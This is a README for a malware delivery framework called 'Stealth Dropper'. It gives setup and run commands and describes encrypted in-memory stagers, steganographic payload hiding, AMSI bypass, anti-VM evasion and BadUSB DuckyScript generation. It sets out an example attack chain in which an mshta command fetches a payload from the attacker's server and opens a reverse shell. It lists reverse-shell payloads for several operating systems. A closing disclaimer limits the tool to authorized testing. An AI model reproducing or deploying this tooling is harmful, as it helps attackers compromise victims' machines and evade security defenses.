# 🕵️‍♂️ Stealth Dropper (2025 Edition)

**A multi-stage, multi-OS, in-memory malware delivery framework**

---

## ✅ Features

- **AES-256 encrypted payload delivery**
- **Full in-memory execution** (no file drops)
- **Multi-OS support:** Windows / Linux / macOS
- **Web-based stagers:** mshta / rundll32 / regsvr32
- **Payload delivery via:** CSS, JSON, PNG (LSB steganography)
- **Anti-VM / sandbox detection module**
- **DuckyScript generation** for WiFi BadUSB

---

## 📁 Project Structure

```text
stealth-dropper/
├── run.sh                  # Main automation script
├── config/                 # Config/settings.json
├── core/                   # Anti-VM scripts (e.g., anti_vm.ps1)
├── output/                 # Generated stagers & logs
├── payloads/               # Raw stage 2 payloads by OS
├── stagers/                # Template stage 1 payloads for delivery
├── tools/                  # Encryption & embedding tools
└── web/                    # Hosted delivery files
```

---

## 🚀 Getting Started

### 1. Clone & Set Up Virtual Environment

```bash
# Clone the repository
git clone https://github.com/trxtr337/stealth-dropper-EXTENDED.git
cd stealth-dropper-EXTENDED

# Create a virtual environment
python3 -m venv venv

# Activate the environment
# Linux/macOS:
source venv/bin/activate
# Windows:
venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt
```

### 2. Configure Encryption Key

Create a `.env` file and set your encryption key:

```env
ENCRYPTION_KEY=Zxcvbnm1234567890Zxcvbnm12345678
```

### 3. Build & Run

```bash
chmod +x run.sh
./run.sh
```

**You will be prompted to select:**
- IP and PORTS
- Target OS
- Payload type (e.g., shell_reverse)
- Delivery method (css / manifest / png)

**Result:**
- Stage 2 is AES-encrypted
- Stage 1 (PowerShell / HTA / SCT) is generated
- Payload is embedded in CSS/JSON/PNG
- Server starts at `http://<your-ip>:<port>`
- DuckyScript saved in `output/ducky_payload.txt`

---

## 🧪 Example Attack Chain (Windows)

```text
1. Deliver WiFi Ducky:
   > GUI r
   > mshta http://<your-ip>:8000/decrypt.html

2. HTML decrypts AES payload from CSS/JSON/PNG
3. Executes PowerShell stage 2 in memory
4. Reverse shell connects back to you
```

---

## 📦 Supported Payloads

- `windows/shell_reverse` → PowerShell TCP shell
- `windows/lolbins/js_payload.html` → mshta/jscript shell
- `linux/bash_reverse` → Bash reverse TCP shell
- `mac/osascript` → AppleScript reverse shell

---

## 🔐 Stealth Considerations

- No `IEX` / no `downloadstring` / no `Invoke-Obfuscation`
- AMSI bypass injected in stage 1
- Built-in anti-VM checks (RAM, hostname, vendor)
- No file drops unless explicitly instructed

---

## 🛠 Requirements

- Python **3.8+**
- `pip install -r requirements.txt`
- Dependencies: `python-dotenv`, `pycryptodome`, `Pillow`

---

## ⚠️ Legal Notice

> **This project is for educational and authorized testing use only.**  
> You are responsible for your actions. Do not deploy without explicit permission.

